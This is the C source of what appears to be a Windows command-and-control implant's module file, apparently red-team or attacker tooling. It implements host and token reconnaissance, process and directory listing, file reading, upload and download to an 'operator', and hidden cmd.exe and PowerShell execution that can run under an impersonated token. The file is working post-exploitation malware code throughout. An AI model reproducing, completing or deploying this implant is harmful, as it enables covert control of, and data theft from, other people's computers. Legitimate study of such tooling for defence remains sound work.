/*
 * modules.c — System info collection and native module implementations.
 * All operations use Win32 API directly — no child processes spawned
 * (except shell/powershell which intentionally spawn cmd.exe/powershell.exe).
 *
 * Modules: whoami, ps, ls, cat, upload, download, shell, powershell
 */
#include "agent.h"

/* Helper: buf_append a string literal with auto-length */
#define BUF_STR(buf, s) buf_append(buf, s, (DWORD)(sizeof(s) - 1))

/* ─── Argument parsing helpers (BeaconDataParse-compatible) ─── */

typedef struct {
    const unsigned char *data;
    DWORD offset;
    DWORD length;
} ArgParser;

static void arg_parse_init(ArgParser *p, const unsigned char *data, DWORD len) {
    p->data = data;
    p->offset = 0;
    p->length = len;
}

static const char *arg_extract_str(ArgParser *p) {
    if (p->offset + 4 > p->length) return "";
    DWORD slen;
    memcpy(&slen, p->data + p->offset, 4);
    p->offset += 4;
    if (p->offset + slen > p->length) return "";
    const char *str = (const char *)(p->data + p->offset);
    p->offset += slen;
    return str;
}

static int arg_extract_int(ArgParser *p) {
    if (p->offset + 4 > p->length) return 0;
    int val;
    memcpy(&val, p->data + p->offset, 4);
    p->offset += 4;
    return val;
}

static const unsigned char *arg_extract_bin(ArgParser *p, DWORD *out_len) {
    if (p->offset + 4 > p->length) { *out_len = 0; return NULL; }
    DWORD blen;
    memcpy(&blen, p->data + p->offset, 4);
    p->offset += 4;
    if (p->offset + blen > p->length) { *out_len = 0; return NULL; }
    const unsigned char *ptr = p->data + p->offset;
    p->offset += blen;
    *out_len = blen;
    return ptr;
}

/* ─── System info collection ─── */

void sysinfo_collect(Buffer *tlv_out) {
    char buf[512];

    /* Hostname */
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size))
        tlv_add_string(tlv_out, TLV_HOSTNAME, buf);

    /* Username (DOMAIN\user) — use thread token if impersonating */
    HANDLE hToken;
    BOOL gotToken = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken);
    if (!gotToken)
        gotToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (gotToken) {
        DWORD token_len;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
        unsigned char *token_buf = (unsigned char *)malloc(token_len);
        if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
            TOKEN_USER *tu = (TOKEN_USER *)token_buf;
            char name[128] = {0}, domain[128] = {0};
            DWORD name_len = sizeof(name), domain_len = sizeof(domain);
            SID_NAME_USE snu;
            if (LookupAccountSidA(NULL, tu->User.Sid, name, &name_len,
                                  domain, &domain_len, &snu)) {
                snprintf(buf, sizeof(buf), "%s\\%s", domain, name);
                tlv_add_string(tlv_out, TLV_USERNAME, buf);
            }
        }
        free(token_buf);

        /* Integrity level */
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
        token_buf = (unsigned char *)malloc(token_len);
        if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
            TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
            DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                         *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
            BYTE level = INTEGRITY_MEDIUM;
            if (*sub >= 0x4000) level = INTEGRITY_SYSTEM;
            else if (*sub >= 0x3000) level = INTEGRITY_HIGH;
            else if (*sub >= 0x2000) level = INTEGRITY_MEDIUM;
            else level = INTEGRITY_LOW;
            tlv_add_uint8(tlv_out, TLV_INTEGRITY, level);

            /* Is admin? */
            BOOL is_admin = FALSE;
            SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
            PSID adminSid;
            if (AllocateAndInitializeSid(&ntAuth, 2,
                    SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                    0, 0, 0, 0, 0, 0, &adminSid)) {
                CheckTokenMembership(NULL, adminSid, &is_admin);
                FreeSid(adminSid);
            }
            tlv_add_uint8(tlv_out, TLV_IS_ADMIN, is_admin ? 1 : 0);
        }
        free(token_buf);
        CloseHandle(hToken);
    }

    /* PID */
    tlv_add_uint32(tlv_out, TLV_PID, GetCurrentProcessId());

    /* Architecture */
#ifdef _WIN64
    tlv_add_uint8(tlv_out, TLV_ARCH, ARCH_X64);
#else
    BOOL isWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isWow64);
    tlv_add_uint8(tlv_out, TLV_ARCH, isWow64 ? ARCH_X64 : ARCH_X86);
#endif

    /* OS version from registry */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char product[256] = {0}, build[64] = {0};
        DWORD psize = sizeof(product), bsize = sizeof(build);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)product, &psize);
        RegQueryValueExA(hKey, "CurrentBuildNumber", NULL, NULL, (LPBYTE)build, &bsize);
        snprintf(buf, sizeof(buf), "%s Build %s", product, build);
        tlv_add_string(tlv_out, TLV_OS_VERSION, buf);
        RegCloseKey(hKey);
    }

    /* Process name */
    char proc_name[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, proc_name, MAX_PATH);
    char *slash = strrchr(proc_name, '\\');
    tlv_add_string(tlv_out, TLV_PROCESS_NAME, slash ? slash + 1 : proc_name);

    /* Runtime (C agent, no .NET) */
    tlv_add_string(tlv_out, TLV_DOTNET_VERSION, "native-c");
    char agent_ver_dec[32];
    DECRYPT_CONFIG(agent_ver_dec, AGENT_VER);
    tlv_add_string(tlv_out, TLV_AGENT_VERSION, agent_ver_dec);
    SecureZeroMemory(agent_ver_dec, sizeof(agent_ver_dec));

    /* CWD */
    char cwd[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, cwd);
    tlv_add_string(tlv_out, TLV_CWD, cwd);
}

/* ─── Module: whoami ─── */

/* Helper: map SID_NAME_USE enum to display string */
static const char *sid_type_str(SID_NAME_USE snu) {
    switch (snu) {
        case SidTypeUser:           return "User";
        case SidTypeGroup:          return "Group";
        case SidTypeDomain:         return "Domain";
        case SidTypeAlias:          return "Alias";
        case SidTypeWellKnownGroup: return "Well-known group";
        case SidTypeDeletedAccount: return "Deleted account";
        case SidTypeInvalid:        return "Invalid";
        case SidTypeComputer:       return "Computer";
        case SidTypeLabel:          return "Label";
        default:                    return "Unknown";
    }
}

/* Helper: decode group attributes bitmask to readable string */
static void group_attrs_str(DWORD attrs, char *buf, DWORD buf_size) {
    buf[0] = '\0';
    if (attrs & SE_GROUP_MANDATORY)
        strncat(buf, "Mandatory group, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_ENABLED_BY_DEFAULT)
        strncat(buf, "Enabled by default, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_ENABLED)
        strncat(buf, "Enabled group, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_OWNER)
        strncat(buf, "Group owner, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_USE_FOR_DENY_ONLY)
        strncat(buf, "Deny only, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_INTEGRITY)
        strncat(buf, "Integrity, ", buf_size - strlen(buf) - 1);
    if (attrs & SE_GROUP_LOGON_ID)
        strncat(buf, "Logon ID, ", buf_size - strlen(buf) - 1);
    /* Trim trailing ", " */
    size_t len = strlen(buf);
    if (len >= 2 && buf[len - 2] == ',')
        buf[len - 2] = '\0';
}

void mod_whoami(Buffer *out) {
    char line[1024];
    HANDLE hToken;

    /* Try thread token first (set by ImpersonateLoggedOnUser / getsystem BOF),
       fall back to process token if no impersonation is active */
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken)) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            BUF_STR(out, "Failed to open token\n");
            return;
        }
    }

    /* ── USER INFORMATION ── */
    DWORD token_len = 0;
    unsigned char *token_buf = NULL;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
    if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
        if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
            TOKEN_USER *tu = (TOKEN_USER *)token_buf;

            char name[256] = {0}, domain[256] = {0};
            DWORD name_len = sizeof(name), domain_len = sizeof(domain);
            SID_NAME_USE snu;
            LookupAccountSidA(NULL, tu->User.Sid, name, &name_len, domain, &domain_len, &snu);

            char *sid_str = NULL;
            ConvertSidToStringSidA(tu->User.Sid, &sid_str);

            char fullname[512];
            snprintf(fullname, sizeof(fullname), "%s\\%s", domain, name);

            BUF_STR(out, "\nUSER INFORMATION\n");
            BUF_STR(out, "----------------\n");
            snprintf(line, sizeof(line), "%-45s %s\n", "User Name", "SID");
            buf_append(out, line, (DWORD)strlen(line));
            snprintf(line, sizeof(line), "%-45s %s\n",
                     "=============================================",
                     "============================================");
            buf_append(out, line, (DWORD)strlen(line));
            snprintf(line, sizeof(line), "%-45s %s\n", fullname, sid_str ? sid_str : "?");
            buf_append(out, line, (DWORD)strlen(line));
            if (sid_str) LocalFree(sid_str);
        }
        free(token_buf);
    }

    /* ── GROUP INFORMATION ── */
    token_len = 0;
    token_buf = NULL;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &token_len);
    if (token_len == 0) goto skip_groups;
    token_buf = (unsigned char *)malloc(token_len);
    if (!token_buf) goto skip_groups;
    if (GetTokenInformation(hToken, TokenGroups, token_buf, token_len, &token_len)) {
        TOKEN_GROUPS *tg = (TOKEN_GROUPS *)token_buf;

        BUF_STR(out, "\nGROUP INFORMATION\n");
        BUF_STR(out, "-----------------\n");
        snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
                 "Group Name", "Type", "SID", "Attributes");
        buf_append(out, line, (DWORD)strlen(line));
        snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
                 "==================================================",
                 "==================",
                 "==================================================",
                 "==============================");
        buf_append(out, line, (DWORD)strlen(line));

        for (DWORD i = 0; i < tg->GroupCount; i++) {
            char gname[256] = {0}, gdomain[256] = {0};
            DWORD gn_len = sizeof(gname), gd_len = sizeof(gdomain);
            SID_NAME_USE gsnu;
            char gfull[512] = {0};
            char *gsid_str = NULL;
            char attr_buf[512] = {0};

            if (LookupAccountSidA(NULL, tg->Groups[i].Sid, gname, &gn_len,
                                  gdomain, &gd_len, &gsnu)) {
                if (gdomain[0])
                    snprintf(gfull, sizeof(gfull), "%s\\%s", gdomain, gname);
                else
                    snprintf(gfull, sizeof(gfull), "%s", gname);
            } else {
                snprintf(gfull, sizeof(gfull), "(unknown)");
                gsnu = SidTypeUnknown;
            }

            ConvertSidToStringSidA(tg->Groups[i].Sid, &gsid_str);
            group_attrs_str(tg->Groups[i].Attributes, attr_buf, sizeof(attr_buf));

            snprintf(line, sizeof(line), "%-50s %-18s %-50s %s\n",
                     gfull, sid_type_str(gsnu),
                     gsid_str ? gsid_str : "?", attr_buf);
            buf_append(out, line, (DWORD)strlen(line));
            if (gsid_str) LocalFree(gsid_str);
        }
    }
    free(token_buf);
skip_groups:

    /* ── PRIVILEGES INFORMATION ── */
    token_len = 0;
    token_buf = NULL;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &token_len);
    if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
        if (GetTokenInformation(hToken, TokenPrivileges, token_buf, token_len, &token_len)) {
            TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)token_buf;

            BUF_STR(out, "\nPRIVILEGES INFORMATION\n");
            BUF_STR(out, "----------------------\n");
            snprintf(line, sizeof(line), "%-42s %-52s %s\n",
                     "Privilege Name", "Description", "State");
            buf_append(out, line, (DWORD)strlen(line));
            snprintf(line, sizeof(line), "%-42s %-52s %s\n",
                     "==========================================",
                     "====================================================",
                     "=============");
            buf_append(out, line, (DWORD)strlen(line));

            for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
                char priv_name[128] = {0};
                DWORD pn_len = sizeof(priv_name);
                LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, priv_name, &pn_len);

                /* Get human-readable description via LookupPrivilegeDisplayNameA */
                char priv_desc[256] = {0};
                DWORD pd_len = sizeof(priv_desc);
                DWORD lang_id = 0;
                if (!LookupPrivilegeDisplayNameA(NULL, priv_name, priv_desc, &pd_len, &lang_id))
                    strncpy(priv_desc, "(no description)", sizeof(priv_desc) - 1);

                const char *status = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
                                     ? "Enabled" : "Disabled";
                snprintf(line, sizeof(line), "%-42s %-52s %s\n", priv_name, priv_desc, status);
                buf_append(out, line, (DWORD)strlen(line));
            }
        }
        free(token_buf);
    }

    /* ── INTEGRITY LEVEL ── */
    token_len = 0;
    token_buf = NULL;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
    if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
        if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
            TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
            DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                         *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
            const char *level = "Medium Mandatory Level";
            if (*sub >= 0x4000) level = "System Mandatory Level";
            else if (*sub >= 0x3000) level = "High Mandatory Level";
            else if (*sub < 0x2000) level = "Low Mandatory Level";

            char *int_sid = NULL;
            ConvertSidToStringSidA(tml->Label.Sid, &int_sid);
            snprintf(line, sizeof(line), "\nIntegrity: %s (%s)\n",
                     level, int_sid ? int_sid : "?");
            buf_append(out, line, (DWORD)strlen(line));
            if (int_sid) LocalFree(int_sid);
        }
        free(token_buf);
    }

    CloseHandle(hToken);
}

/* ─── Module: ps (process list) ─── */

void mod_ps(Buffer *out) {
    char line[512];
    snprintf(line, sizeof(line), "%-6s %-6s %-6s %s\n", "PID", "PPID", "SID", "NAME");
    buf_append(out, line, (DWORD)strlen(line));
    buf_append(out, "────── ────── ────── ────────────────────\n", 42);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            snprintf(line, sizeof(line), "%-6lu %-6lu %-6lu %s\n",
                     pe.th32ProcessID, pe.th32ParentProcessID,
                     0UL, /* session ID not in PROCESSENTRY32 */
                     pe.szExeFile);
            buf_append(out, line, (DWORD)strlen(line));
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
}

/* ─── Module: ls (directory listing) ─── */

void mod_ls(Buffer *out, const char *path) {
    char search[MAX_PATH];
    char line[1024];

    if (!path || strlen(path) == 0)
        GetCurrentDirectoryA(MAX_PATH, search);
    else
        strncpy(search, path, MAX_PATH - 3);

    /* Append \* for FindFirstFile */
    size_t slen = strlen(search);
    if (search[slen - 1] != '\\') strcat(search, "\\");
    strcat(search, "*");

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(line, sizeof(line), "Error listing: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, line, (DWORD)strlen(line));
        return;
    }

    snprintf(line, sizeof(line), "%-5s %-20s %-12s %s\n", "TYPE", "MODIFIED", "SIZE", "NAME");
    buf_append(out, line, (DWORD)strlen(line));
    buf_append(out, "───── ──────────────────── ──────────── ────────────────────\n", 60);

    do {
        const char *type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";

        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        char timestr[32];
        snprintf(timestr, sizeof(timestr), "%04d-%02d-%02d %02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        ULONGLONG fsize = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;

        snprintf(line, sizeof(line), "%-5s %-20s %-12llu %s\n",
                 type, timestr, fsize, fd.cFileName);
        buf_append(out, line, (DWORD)strlen(line));
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* ─── Module: cd (change directory) ─── */

void mod_cd(Buffer *out, const char *path) {
    if (!path || strlen(path) == 0) {
        /* No argument — print current directory */
        char cwd[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, cwd);
        buf_append(out, cwd, (DWORD)strlen(cwd));
        return;
    }

    if (!SetCurrentDirectoryA(path)) {
        char err[512];
        snprintf(err, sizeof(err), "cd: cannot access '%s' (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    /* Return new CWD so operator can update prompt */
    char cwd[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, cwd);
    buf_append(out, cwd, (DWORD)strlen(cwd));
}

/* ─── Module: cat (read file) ─── */

void mod_cat(Buffer *out, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "Cannot open: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize > 10 * 1024 * 1024) { /* 10MB limit */
        buf_append(out, "File too large (>10MB)\n", 22);
        CloseHandle(hFile);
        return;
    }

    unsigned char *fbuf = (unsigned char *)malloc(fsize);
    DWORD bytes_read;
    if (ReadFile(hFile, fbuf, fsize, &bytes_read, NULL)) {
        buf_append(out, fbuf, bytes_read);
    }
    free(fbuf);
    CloseHandle(hFile);
}

/* ─── Module: upload (write file to target) ─── */

void mod_upload(Buffer *out, const char *path,
                const unsigned char *data, DWORD data_len) {
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "Cannot create: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    DWORD written;
    if (WriteFile(hFile, data, data_len, &written, NULL)) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Written %lu bytes to %s\n", written, path);
        buf_append(out, msg, (DWORD)strlen(msg));
    }
    CloseHandle(hFile);
}

/* ─── Module: download (read file for transfer to operator) ─── */

void mod_download(Buffer *out, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return; /* Error signaled via result status */
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize > 50 * 1024 * 1024) { /* 50MB limit */
        CloseHandle(hFile);
        return;
    }

    unsigned char *fbuf = (unsigned char *)malloc(fsize);
    DWORD bytes_read;
    if (ReadFile(hFile, fbuf, fsize, &bytes_read, NULL)) {
        buf_append(out, fbuf, bytes_read);
    }
    free(fbuf);
    CloseHandle(hFile);
}

/* ─── Module: shell / powershell (DANGER: spawns child process) ─── */

static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershell) {
    /*
     * Spawn cmd.exe /c <cmd> or powershell.exe -NoProfile -NonInteractive -Command <cmd>
     * Capture stdout + stderr via anonymous pipes.
     * This is the ONE case where we intentionally spawn a child process.
     */
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    HANDLE hStdoutRead = NULL, hStdoutWrite = NULL;
    HANDLE hStderrRead = NULL, hStderrWrite = NULL;

    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0) ||
        !CreatePipe(&hStderrRead, &hStderrWrite, &sa, 0)) {
        buf_append(out, "Failed to create pipes\n", 23);
        return;
    }

    /* Ensure read ends are NOT inherited */
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0);

    /* Build command line */
    char full_cmd[8192];
    if (use_powershell) {
        snprintf(full_cmd, sizeof(full_cmd),
                 "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd_line);
    } else {
        snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s", cmd_line);
    }

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStderrWrite;
    si.hStdInput = NULL;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    DBG("[shell] executing: %s", full_cmd);

    /*
     * If the thread is impersonating (getsystem / tokenmanip), use
     * CreateProcessWithTokenW so the child runs as the impersonated
     * identity.  Only needs SeImpersonatePrivilege (admins have it).
     * Fall back to plain CreateProcessA when not impersonating.
     */
    BOOL spawned = FALSE;
    HANDLE hThreadToken = NULL;
    if (OpenThreadToken(GetCurrentThread(),
                        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
                        FALSE, &hThreadToken)) {
        /* Duplicate as a primary token — CreateProcessWithTokenW needs one */
        HANDLE hPrimary = NULL;
        if (DuplicateTokenEx(hThreadToken, MAXIMUM_ALLOWED, NULL,
                             SecurityImpersonation, TokenPrimary, &hPrimary)) {
            WCHAR wCmd[8192];
            MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wCmd, 8192);

            STARTUPINFOW siw;
            memset(&siw, 0, sizeof(siw));
            siw.cb = sizeof(siw);
            siw.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            siw.hStdOutput = hStdoutWrite;
            siw.hStdError  = hStderrWrite;
            siw.hStdInput  = NULL;
            siw.wShowWindow = SW_HIDE;

            /* CreateProcessWithTokenW — seclogon service handles duplicating
             * the pipe handles into the new process internally. */
            spawned = CreateProcessWithTokenW(
                hPrimary,
                0,             /* dwLogonFlags: 0 = no profile load */
                NULL,          /* lpApplicationName */
                wCmd,          /* lpCommandLine */
                CREATE_NO_WINDOW,
                NULL,          /* lpEnvironment */
                NULL,          /* lpCurrentDirectory */
                &siw, &pi);

            if (!spawned) {
                DBG("[shell] CreateProcessWithTokenW failed (err=%lu), falling back",
                    GetLastError());
            }
            CloseHandle(hPrimary);
        }
        CloseHandle(hThreadToken);
    }

    if (!spawned) {
        spawned = CreateProcessA(NULL, full_cmd, NULL, NULL, TRUE,
                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }

    if (!spawned) {
        char err[256];
        snprintf(err, sizeof(err), "CreateProcess failed (err=%lu)\n", GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        CloseHandle(hStdoutRead); CloseHandle(hStdoutWrite);
        CloseHandle(hStderrRead); CloseHandle(hStderrWrite);
        return;
    }

    /* Close write ends in parent — child has them.
     * This is critical: ReadFile on the read end will return FALSE
     * with ERROR_BROKEN_PIPE once the child exits and all data is read. */
    CloseHandle(hStdoutWrite);
    CloseHandle(hStderrWrite);
    hStdoutWrite = NULL;
    hStderrWrite = NULL;

    /* Read stdout BEFORE waiting — prevents pipe buffer deadlock.
     * ReadFile blocks until data is available or the pipe breaks (child exits).
     * If the child writes more than the pipe buffer (4KB default),
     * WaitForSingleObject would deadlock because the child blocks on write. */
    DWORD bytes_read;
    char read_buf[4096];
    while (TRUE) {
        if (ReadFile(hStdoutRead, read_buf, sizeof(read_buf), &bytes_read, NULL) && bytes_read > 0) {
            buf_append(out, read_buf, bytes_read);
        } else {
            break;  /* ERROR_BROKEN_PIPE = child exited, pipe drained */
        }
    }

    /* Read any remaining stderr */
    while (TRUE) {
        if (ReadFile(hStderrRead, read_buf, sizeof(read_buf), &bytes_read, NULL) && bytes_read > 0) {
            buf_append(out, "[STDERR] ", 9);
            buf_append(out, read_buf, bytes_read);
        } else {
            break;
        }
    }

    /* Now wait for process exit (should be near-instant since pipes are drained) */
    WaitForSingleObject(pi.hProcess, 5000);

    CloseHandle(hStdoutRead);
    CloseHandle(hStderrRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

/* ─── Module dispatch ─── */

BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                    unsigned char **result, DWORD *result_len) {
    Buffer out;
    buf_init(&out, 4096);

    DBG("[module] executing module '%s' (args_len=%u)", name, args_len);

    ArgParser ap;
    arg_parse_init(&ap, args, args_len);

    if (strcmp(name, "whoami") == 0) {
        mod_whoami(&out);
    }
    else if (strcmp(name, "ps") == 0) {
        mod_ps(&out);
    }
    else if (strcmp(name, "ls") == 0) {
        /* Args come as raw string from operator, not BeaconDataParse format */
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_ls(&out, path_str);
        if (path_str) free(path_str);
    }
    else if (strcmp(name, "cd") == 0) {
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_cd(&out, path_str);
        if (path_str) free(path_str);
    }
    else if (strcmp(name, "cat") == 0) {
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_cat(&out, path_str);
        if (path_str) free(path_str);
    }
    else if (strcmp(name, "upload") == 0) {
        const char *path = arg_extract_str(&ap);
        DWORD data_len;
        const unsigned char *data = arg_extract_bin(&ap, &data_len);
        mod_upload(&out, path, data, data_len);
    }
    else if (strcmp(name, "download") == 0) {
        char *path_str = NULL;
        if (args && args_len > 0) {
            path_str = (char *)malloc(args_len + 1);
            memcpy(path_str, args, args_len);
            path_str[args_len] = '\0';
        }
        mod_download(&out, path_str ? path_str : "");
        if (path_str) free(path_str);
    }
    else if (strcmp(name, "shell") == 0 || strcmp(name, "powershell") == 0) {
        /*
         * shell/powershell: arguments come as raw UTF-8 bytes (NOT BeaconDataParse format).
         * The operator CLI sends the command string directly.
         */
        BOOL use_ps = (strcmp(name, "powershell") == 0);
        if (args && args_len > 0) {
            /* Null-terminate the command string */
            char *cmd_str = (char *)malloc(args_len + 1);
            memcpy(cmd_str, args, args_len);
            cmd_str[args_len] = '\0';
            mod_shell_exec(&out, cmd_str, use_ps);
            free(cmd_str);
        } else {
            buf_append(&out, "No command specified\n", 20);
        }
    }
    else if (strcmp(name, "rev2self") == 0) {
        if (RevertToSelf()) {
            buf_append(&out, "[+] Reverted to process token\n", 30);
        } else {
            char err[128];
            snprintf(err, sizeof(err), "[-] RevertToSelf failed (err=%u)\n", (unsigned)GetLastError());
            buf_append(&out, err, (DWORD)strlen(err));
        }
    }
    else {
        char err[256];
        snprintf(err, sizeof(err), "Unknown module: %s\n", name);
        buf_append(&out, err, (DWORD)strlen(err));
        *result = out.data;
        *result_len = out.len;
        return FALSE;
    }

    *result = out.data;
    *result_len = out.len;
    return TRUE;
}
